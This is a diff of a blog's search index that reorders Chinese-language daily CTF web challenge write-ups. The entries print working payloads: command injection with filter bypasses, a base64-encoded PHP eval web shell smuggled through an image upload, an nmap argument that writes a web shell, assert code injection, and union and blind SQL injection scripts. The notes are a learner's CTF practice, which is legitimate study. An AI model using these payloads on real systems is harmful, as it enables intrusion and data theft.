@@ -36,95 +36,6 @@
       </tags>
   </entry>
   <entry>
-    <title>20210516</title>
-    <url>/posts/436545a/</url>
-    <content><![CDATA[<h2 id="BUUCTF-ACTF2020-新生赛-Exec"><a href="#BUUCTF-ACTF2020-新生赛-Exec" class="headerlink" title="BUUCTF[ACTF2020 新生赛]Exec"></a>BUUCTF[ACTF2020 新生赛]Exec</h2><blockquote>
-<p>something wrong so I must use English</p>
-</blockquote>
-<p>command execustion and some strange sign</p>
-<p>just need to ping 127.0.0.1 and we can see that it is ok to connect and then we need use the pipe sign to ping like this</p>
-<pre><code>127.0.0.1 | cat /flag
-</code></pre>
-<p>| is a sign that just do the thing behind</p>
-<p>|| if the first iswrong then do the second</p>
-<p>&amp; is do both the two don’need right</p>
-<p>&amp;&amp; is A-&gt;B A must right then B will be done</p>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20210519</title>
-    <url>/posts/948949cb/</url>
-    <content><![CDATA[<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><blockquote>
-<p>远程命令执行 绕过</p>
-</blockquote>
-<p>对空格进行了过滤绕过方法：</p>
-<ul>
-<li>${IFS}替换</li>
-<li>$IFS$1替换</li>
-<li>${IFS替换</li>
-<li>%20替换</li>
-<li>&lt;和&lt;&gt;重定向符替换</li>
-<li>%09替换</li>
-</ul>
-<p>cat绕过</p>
-<pre><code>(1)more:一页一页的显示档案内容
-
-(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页
-
-(3)head:查看头几行
-
-(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
-
-(5)tail:查看尾几行
-
-(6)nl：显示的时候，顺便输出行号
-
-(7)od:以二进制的方式读取档案内容
-
-(8)vi:一种编辑器，这个也可以查看
-
-(9)vim:一种编辑器，这个也可以查看
-
-(10)sort:可以查看
-
-(11)uniq:可以查看
-
-(12)file -f:报错出具体内容
-</code></pre>
-<p>先执行</p>
-<pre><code>127.0.0.1|ls
-</code></pre>
-<p>看到有flag.php和index.php</p>
-<p>cat发现把空格过滤，这有个绕过，$IFS$1替换，又把flag给过滤了，然后看index的源码，继续绕过。</p>
-<p>1 变量拼接</p>
-<p>payload</p>
-<pre><code>?ip=1;a=g;cat$IFS$1fla$a.php
-</code></pre>
-<p>2 base64编码</p>
-<p>payload</p>
-<pre><code>?ip=1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
-</code></pre>
-<p>3 内敛绕过</p>
-<pre><code>?ip=127.0.0.1;cat$IFS$1`ls`
-</code></pre>
-<p>将反引号里面的结果作为命令执行</p>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>20210518</title>
     <url>/posts/e38e795d/</url>
     <content><![CDATA[<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><blockquote>
@@ -192,6 +103,87 @@ EXECUTE name;  //执行预定义SQL语句
       </tags>
   </entry>
   <entry>
+    <title>20210516</title>
+    <url>/posts/436545a/</url>
+    <content><![CDATA[<h2 id="BUUCTF-ACTF2020-新生赛-Exec"><a href="#BUUCTF-ACTF2020-新生赛-Exec" class="headerlink" title="BUUCTF[ACTF2020 新生赛]Exec"></a>BUUCTF[ACTF2020 新生赛]Exec</h2><blockquote>
+<p>something wrong so I must use English</p>
+</blockquote>
+<p>command execustion and some strange sign</p>
+<p>just need to ping 127.0.0.1 and we can see that it is ok to connect and then we need use the pipe sign to ping like this</p>
+<pre><code>127.0.0.1 | cat /flag
+</code></pre>
+<p>| is a sign that just do the thing behind</p>
+<p>|| if the first iswrong then do the second</p>
+<p>&amp; is do both the two don’need right</p>
+<p>&amp;&amp; is A-&gt;B A must right then B will be done</p>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210524</title>
+    <url>/posts/c11566b5/</url>
+    <content><![CDATA[<h2 id="flag藏在变量里"><a href="#flag藏在变量里" class="headerlink" title="flag藏在变量里"></a>flag藏在变量里</h2><p>神奇的GLOBALS打印出全部变量<br>    /?args=GLOBALS</p>
+<h2 id="dirsearch使用"><a href="#dirsearch使用" class="headerlink" title="dirsearch使用"></a>dirsearch使用</h2><p>-u  指定网址</p>
+<p>-e   指定网站语言</p>
+<p>-w   指定字典</p>
+<p>-r    递归目录（跑出目录后，继续跑目录下面的目录）</p>
+<p>-random-agents  使用随机UA</p>
+<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><pre><code>python dirsearch.py -u 网址 -e php 或 python .\dirsearch.py -u 网址 -e php
+</code></pre>
+<h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>先用dirsearch扫目录，找到index.php.bak，代码审计。</p>
+<pre><code>&lt;?php
+/**
+* Created by PhpStorm.
+* User: Norse
+* Date: 2017/8/6
+* Time: 20:22
+*/
+include_once &quot;flag.php&quot;;
+ini_set(&quot;display_errors&quot;, 0);
+$str = strstr($_SERVER[&#39;REQUEST_URI&#39;], &#39;?&#39;); 
+$str = substr($str,1);              #字符串截取
+$str = str_replace(&#39;key&#39;,&#39;&#39;,$str);  #字符串替换
+parse_str($str);                    #解析字符串为变量
+echo md5($key1);
+
+echo md5($key2);
+if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;
+    echo $flag.&quot;取得flag&quot;;
+&#125;
+?&gt;
+</code></pre>
+<p>利用MD5不处理数组的特性，构造两个key</p>
+<pre><code>payload: http://114.67.246.176:19217/index.php?kkeyey1[]=1&amp;kkeyey2[]=2
+</code></pre>
+<h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><p>姿势：</p>
+<pre><code>id=0&#39; union select 1,2,3,4#
+查数据库
+id=0&#39; union select 1,2,3,database()#
+查表
+id=0&#39; union select 1,2,3,table_name from information_schema.tables where table_schema=&#39;库名&#39;# 
+查列
+id=0&#39; union select 1,2,3,column_name from information_schema.columns where table_name=&#39;表名&#39;#
+查值
+id=0&#39; union select 1,2,3,列名 from 表名#
+</code></pre>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>sql注入</tag>
+        <tag>代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>20210522</title>
     <url>/posts/2876c380/</url>
     <content><![CDATA[<h2 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h2><pre><code>127.0.0.1 | find / -name flag #一种查找方法
@@ -232,6 +224,72 @@ EXECUTE name;  //执行预定义SQL语句
         <tag>web</tag>
         <tag>sql注入</tag>
         <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210519</title>
+    <url>/posts/948949cb/</url>
+    <content><![CDATA[<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><blockquote>
+<p>远程命令执行 绕过</p>
+</blockquote>
+<p>对空格进行了过滤绕过方法：</p>
+<ul>
+<li>${IFS}替换</li>
+<li>$IFS$1替换</li>
+<li>${IFS替换</li>
+<li>%20替换</li>
+<li>&lt;和&lt;&gt;重定向符替换</li>
+<li>%09替换</li>
+</ul>
+<p>cat绕过</p>
+<pre><code>(1)more:一页一页的显示档案内容
+
+(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页
+
+(3)head:查看头几行
+
+(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
+
+(5)tail:查看尾几行
+
+(6)nl：显示的时候，顺便输出行号
+
+(7)od:以二进制的方式读取档案内容
+
+(8)vi:一种编辑器，这个也可以查看
+
+(9)vim:一种编辑器，这个也可以查看
+
+(10)sort:可以查看
+
+(11)uniq:可以查看
+
+(12)file -f:报错出具体内容
+</code></pre>
+<p>先执行</p>
+<pre><code>127.0.0.1|ls
+</code></pre>
+<p>看到有flag.php和index.php</p>
+<p>cat发现把空格过滤，这有个绕过，$IFS$1替换，又把flag给过滤了，然后看index的源码，继续绕过。</p>
+<p>1 变量拼接</p>
+<p>payload</p>
+<pre><code>?ip=1;a=g;cat$IFS$1fla$a.php
+</code></pre>
+<p>2 base64编码</p>
+<p>payload</p>
+<pre><code>?ip=1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
+</code></pre>
+<p>3 内敛绕过</p>
+<pre><code>?ip=127.0.0.1;cat$IFS$1`ls`
+</code></pre>
+<p>将反引号里面的结果作为命令执行</p>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -311,64 +369,6 @@ findFile(path)
         <tag>web</tag>
         <tag>sql注入</tag>
         <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20210524</title>
-    <url>/posts/c11566b5/</url>
-    <content><![CDATA[<h2 id="flag藏在变量里"><a href="#flag藏在变量里" class="headerlink" title="flag藏在变量里"></a>flag藏在变量里</h2><p>神奇的GLOBALS打印出全部变量<br>    /?args=GLOBALS</p>
-<h2 id="dirsearch使用"><a href="#dirsearch使用" class="headerlink" title="dirsearch使用"></a>dirsearch使用</h2><p>-u  指定网址</p>
-<p>-e   指定网站语言</p>
-<p>-w   指定字典</p>
-<p>-r    递归目录（跑出目录后，继续跑目录下面的目录）</p>
-<p>-random-agents  使用随机UA</p>
-<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><pre><code>python dirsearch.py -u 网址 -e php 或 python .\dirsearch.py -u 网址 -e php
-</code></pre>
-<h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>先用dirsearch扫目录，找到index.php.bak，代码审计。</p>
-<pre><code>&lt;?php
-/**
-* Created by PhpStorm.
-* User: Norse
-* Date: 2017/8/6
-* Time: 20:22
-*/
-include_once &quot;flag.php&quot;;
-ini_set(&quot;display_errors&quot;, 0);
-$str = strstr($_SERVER[&#39;REQUEST_URI&#39;], &#39;?&#39;); 
-$str = substr($str,1);              #字符串截取
-$str = str_replace(&#39;key&#39;,&#39;&#39;,$str);  #字符串替换
-parse_str($str);                    #解析字符串为变量
-echo md5($key1);
-
-echo md5($key2);
-if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;
-    echo $flag.&quot;取得flag&quot;;
-&#125;
-?&gt;
-</code></pre>
-<p>利用MD5不处理数组的特性，构造两个key</p>
-<pre><code>payload: http://114.67.246.176:19217/index.php?kkeyey1[]=1&amp;kkeyey2[]=2
-</code></pre>
-<h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><p>姿势：</p>
-<pre><code>id=0&#39; union select 1,2,3,4#
-查数据库
-id=0&#39; union select 1,2,3,database()#
-查表
-id=0&#39; union select 1,2,3,table_name from information_schema.tables where table_schema=&#39;库名&#39;# 
-查列
-id=0&#39; union select 1,2,3,column_name from information_schema.columns where table_name=&#39;表名&#39;#
-查值
-id=0&#39; union select 1,2,3,列名 from 表名#
-</code></pre>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>sql注入</tag>
-        <tag>代码审计</tag>
       </tags>
   </entry>
   <entry>
@@ -484,6 +484,27 @@ id=0&#39; union select 1,2,3,列名 from 表名#
       </tags>
   </entry>
   <entry>
+    <title>20210819</title>
+    <url>/posts/9c51da98/</url>
+    <content><![CDATA[<h1 id="XXX二手交易市场"><a href="#XXX二手交易市场" class="headerlink" title="XXX二手交易市场"></a>XXX二手交易市场</h1><p>一个实战题目，网站挺花哨的，没什么提示，最后在头像上传页面有个漏洞，上传一个图片，抓包发现是将图片转成base64传输的，可以将一句话伪装一下，就像这样</p>
+<pre><code>image=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=
+</code></pre>
+<p>将jpeg换成php,后面的一句话base64encode一下，上传得到返回路径，这时候别乱删，把\给删了，直接蚁剑连接翻目录就行</p>
+<h1 id="点login咋没反应"><a href="#点login咋没反应" class="headerlink" title="点login咋没反应"></a>点login咋没反应</h1><p>F12看到有个admin.css，打开提示try，那就直接try,发现有源码，代码审计，很简单，传入一个cookie，这有个踩坑</p>
+<pre><code> echo urlencode(serialize($KEY));
+</code></pre>
+<p>先urlencode一下不容易出错</p>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>20210818</title>
     <url>/posts/eb56ea0e/</url>
     <content><![CDATA[<h1 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h1><p>代码审计</p>
@@ -576,27 +597,6 @@ Submit
       </tags>
   </entry>
   <entry>
-    <title>20210819</title>
-    <url>/posts/9c51da98/</url>
-    <content><![CDATA[<h1 id="XXX二手交易市场"><a href="#XXX二手交易市场" class="headerlink" title="XXX二手交易市场"></a>XXX二手交易市场</h1><p>一个实战题目，网站挺花哨的，没什么提示，最后在头像上传页面有个漏洞，上传一个图片，抓包发现是将图片转成base64传输的，可以将一句话伪装一下，就像这样</p>
-<pre><code>image=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=
-</code></pre>
-<p>将jpeg换成php,后面的一句话base64encode一下，上传得到返回路径，这时候别乱删，把\给删了，直接蚁剑连接翻目录就行</p>
-<h1 id="点login咋没反应"><a href="#点login咋没反应" class="headerlink" title="点login咋没反应"></a>点login咋没反应</h1><p>F12看到有个admin.css，打开提示try，那就直接try,发现有源码，代码审计，很简单，传入一个cookie，这有个踩坑</p>
-<pre><code> echo urlencode(serialize($KEY));
-</code></pre>
-<p>先urlencode一下不容易出错</p>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>对web漏洞常见缩写的解释</title>
     <url>/posts/e15b0610/</url>
     <content><![CDATA[<h1 id="对web漏洞常见缩写的解释"><a href="#对web漏洞常见缩写的解释" class="headerlink" title="对web漏洞常见缩写的解释"></a>对web漏洞常见缩写的解释</h1><h2 id="xss（跨站脚本攻击）"><a href="#xss（跨站脚本攻击）" class="headerlink" title="xss（跨站脚本攻击）"></a>xss（跨站脚本攻击）</h2><p>全称<strong>Cross Site Scripting</strong>，攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。</p>
@@ -649,20 +649,6 @@ Submit
       </categories>
   </entry>
   <entry>
-    <title>20210827</title>
-    <url>/posts/50c4a45c/</url>
-    <content><![CDATA[<h1 id="秋名山车神"><a href="#秋名山车神" class="headerlink" title="秋名山车神"></a>秋名山车神</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#第一次写与ctf有关的python脚本(抄的)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://114.67.246.176:19128/&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">ret=s.get(url)</span><br><span class="line"></span><br><span class="line">equation = re.search(<span class="string">r&#x27;(\d+[+\-*])+(\d+)&#x27;</span>,ret.text).group()</span><br><span class="line"></span><br><span class="line">ans=<span class="built_in">eval</span>(equation)</span><br><span class="line"></span><br><span class="line">d=&#123;<span class="string">&quot;value&quot;</span>:ans&#125;</span><br><span class="line"></span><br><span class="line">flag=s.post(url,data=d)</span><br><span class="line"></span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>202108203</title>
     <url>/posts/401ec127/</url>
     <content><![CDATA[<h1 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; and 0 union select 1,2,3 #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> <span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,TABLE_SCHEMA,TABLE_NAME <span class="keyword">from</span> INFORMATION_SCHEMA.COLUMNS 表 表名</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; and 0 union select 1,column_name,data_type from information_schema.columns where table_name=&#x27;</span>secret_table<span class="string">&#x27;# 列名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> <span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,fl4g <span class="keyword">from</span> secret_table #</span><br></pre></td></tr></table></figure>
@@ -694,6 +680,43 @@ Submit
       <tags>
         <tag>ctf</tag>
         <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210901</title>
+    <url>/posts/8a5309dc/</url>
+    <content><![CDATA[<h1 id="mfs"><a href="#mfs" class="headerlink" title="mfs"></a>mfs</h1><blockquote>
+<p>git泄露，代码审计，assert命令执行</p>
+</blockquote>
+<pre><code>pyload: ?page=abc&#39;) or system(&quot;tac templates/flag.php&quot;);//
+</code></pre>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<pre><code>python2 GitHack.py http://114.67.246.176:10015/.git/
+</code></pre>
+<p>先用githack,爬取.git,发现存在flag.php,利用assert代码执行，先用’)将strops闭合，<br>然后执行后面的</p>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>rce</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210827</title>
+    <url>/posts/50c4a45c/</url>
+    <content><![CDATA[<h1 id="秋名山车神"><a href="#秋名山车神" class="headerlink" title="秋名山车神"></a>秋名山车神</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#第一次写与ctf有关的python脚本(抄的)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://114.67.246.176:19128/&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">ret=s.get(url)</span><br><span class="line"></span><br><span class="line">equation = re.search(<span class="string">r&#x27;(\d+[+\-*])+(\d+)&#x27;</span>,ret.text).group()</span><br><span class="line"></span><br><span class="line">ans=<span class="built_in">eval</span>(equation)</span><br><span class="line"></span><br><span class="line">d=&#123;<span class="string">&quot;value&quot;</span>:ans&#125;</span><br><span class="line"></span><br><span class="line">flag=s.post(url,data=d)</span><br><span class="line"></span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>python</tag>
       </tags>
   </entry>
   <entry>
@@ -736,19 +759,13 @@ Submit
       </tags>
   </entry>
   <entry>
-    <title>20210901</title>
-    <url>/posts/8a5309dc/</url>
-    <content><![CDATA[<h1 id="mfs"><a href="#mfs" class="headerlink" title="mfs"></a>mfs</h1><blockquote>
-<p>git泄露，代码审计，assert命令执行</p>
-</blockquote>
-<pre><code>pyload: ?page=abc&#39;) or system(&quot;tac templates/flag.php&quot;);//
+    <title>20210907</title>
+    <url>/posts/6330ace9/</url>
+    <content><![CDATA[<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><p>利用了namp一个参数，将一句话写入文件，rce</p>
+<p>同时escapeshellarg()和escapeshellcmd()同时出现会有bug</p>
+<pre><code>pyload:?host=&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php&#39;
 </code></pre>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<pre><code>python2 GitHack.py http://114.67.246.176:10015/.git/
-</code></pre>
-<p>先用githack,爬取.git,发现存在flag.php,利用assert代码执行，先用’)将strops闭合，<br>然后执行后面的</p>
-]]></content>
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
       <categories>
         <category>ctf每日一题</category>
       </categories>
@@ -756,6 +773,50 @@ Submit
         <tag>ctf</tag>
         <tag>web</tag>
         <tag>rce</tag>
+        <tag>命令执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210926</title>
+    <url>/posts/2601fefd/</url>
+    <content><![CDATA[<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>先贴一篇文章，讲的比较好，关于mysql注入的</p>
+<p><a href="https://www.anquanke.com/post/id/85936">https://www.anquanke.com/post/id/85936</a></p>
+<p>这个题呢，最终就是直接跑脚本</p>
+<p>测试1，2会返回两个语句，测试2-1返回1的语句，是数字型注入，然后union发现有waf,fuzz获取过滤的字段，这里学会了怎么用bp进行fuzz，以及fuzzdb这个仓库</p>
+<p>正确的方法是先利用if语句，实现布尔注入。利用括号来绕过空格的过滤。经过测试，用TAB或者%09%0a%0d之类这样的绕过方式也可以成功绕过空格。</p>
+<p>sql的三目运算</p>
+<pre><code>if( 表达式1，表达式2，表达式3)
+</code></pre>
+<p>如果表达式1是正确的，那么执行表达式2，否则执行表达式3</p>
+<p>或者异或注入</p>
+<pre><code>0^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)
+</code></pre>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;-&#123;abcdefghijklmnopqrstuvwxyz0123456789&#125;&#x27;</span>:</span><br><span class="line">        sqls = <span class="string">f&quot;if(ascii(substr((select(flag)from(flag)),<span class="subst">&#123;i&#125;</span>,1))=ascii(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;),1,2)&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: sqls</span><br><span class="line">        &#125;</span><br><span class="line">        res = r.post(url=url, data=data, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>看到<a href="https://blog.csdn.net/rfrder/article/details/109263584">https://blog.csdn.net/rfrder/article/details/109263584</a>这个大佬想到了stripos的漏洞</p>
+<blockquote>
+<p>这时候想到stripos函数的一个漏洞。如果没有找到的话返回的是false，如果找到了但是是在字符串的首位，返回的是0。如果后端用了弱类型比较的话，0==false，这样后面就可以使用被过滤的某一个字符串了</p>
+</blockquote>
+<p>进行尝试，</p>
+<p>首先id=1union：</p>
+<p>SQL Injection Checked.</p>
+<p>再试试id=union1union：</p>
+<p>bool(false)</p>
+<p>如果这个题目把括号,tab,以及各种可以充当空格的都给过滤了的话，就用这种方法来绕过空格的过滤。</p>
+<p>不过不知道为啥，每次跑出的flag都不一样，呃呃呃，然后都不能过。。。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;d9a6fbce43f97d2164f1b3e&#125;</span><br><span class="line">flag&#123;d95e7a6fc1e43f7d164f414b&#125;</span><br><span class="line">flag&#123;d9e7a6fc1e43f7d214f41b3e&#125;</span><br><span class="line">flag&#123;d956fce443f9f57d14f414b&#125;</span><br></pre></td></tr></table></figure>
+
+<p>原来是’-‘被过滤了，测试到-的时候会返回sql注入</p>
+<p>服务器出了点小意外，不能push了，cpu给爆了，不知道为啥。。</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210927012625.png"></p>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>sql注入</tag>
+        <tag>测试工具</tag>
       </tags>
   </entry>
   <entry>
@@ -815,26 +876,8 @@ Submit
         <tag>ctf</tag>
         <tag>web</tag>
         <tag>sql注入</tag>
-        <tag>文件上传</tag>
         <tag>代码审计</tag>
-      </tags>
-  </entry>
